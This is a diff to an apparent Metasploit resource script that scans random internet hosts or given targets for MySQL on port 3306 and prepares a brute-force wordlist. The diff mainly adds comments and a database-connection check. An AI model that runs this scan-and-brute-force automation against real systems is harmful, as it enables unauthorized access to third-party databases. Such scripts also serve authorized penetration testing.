@@ -27,6 +27,18 @@
       print_line("")
 
 
+      ## Make sure we are connected to db
+      unless framework.db.active
+        print_error("Database not connected to postgresql.")
+        print_warning("[execute] service postgresql start")
+        run_single("exit")
+        return nil
+      else
+        print_good("Database connected to postgresql.")
+        Rex::sleep(1.0)
+      end
+
+      ## Sellect the type of nmap scan to use
       if (framework.datastore['RANDOM_HOSTS'] == "true")
          if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
            run_single("setg LIMMIT 800")
@@ -40,10 +52,13 @@
       elsif (framework.datastore['RHOSTS'])
          print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
       end
+
+      ## Metasploit auxiliarys brute force dicionary absoluct path
       if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
          run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
       end
 
+      ## db_nmap WAN or RHOSTS scan settings
       unless (framework.datastore['RANDOM_HOSTS'] == "true")
          run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse --open #{framework.datastore['RHOSTS']}")
       else
@@ -51,6 +66,7 @@
          run_single("db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['LIMMIT']} --script=mysql-info.nse -p 3306 --open")
       end
 
+      ## Read current database and declare local vars
       run_single("spool mysql_brute.log")
       print_line("")
       run_single("services")
@@ -60,6 +76,7 @@
       proto = framework.db.services.map(&:proto).join(' ')
       xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')
 
+         ## Make sure that exists hosts/ports (open) in database
          if xhost.nil? or xhost == ''
               print_error("db_nmap scan did not find any alive connections.")
               print_error("Please wait, cleaning recent configurations.")
@@ -110,13 +127,14 @@
               Rex::sleep(1.5)
        end
 
-
+      ## Save current database to local file (database.xml)
       if (framework.datastore['SAVE_DB'] == "true")
          rand = Rex::Text.rand_text_alpha(5)
          print_warning("Exporting database to: database_#{rand}.xml")
          run_single("db_export -f xml -a database_#{rand}.xml")
       end
 
+      ## Cleaning database and unset global variables
       print_warning("Please wait, Cleaning global variables.")
       Rex::sleep(1.5)
       run_single("unsetg all")
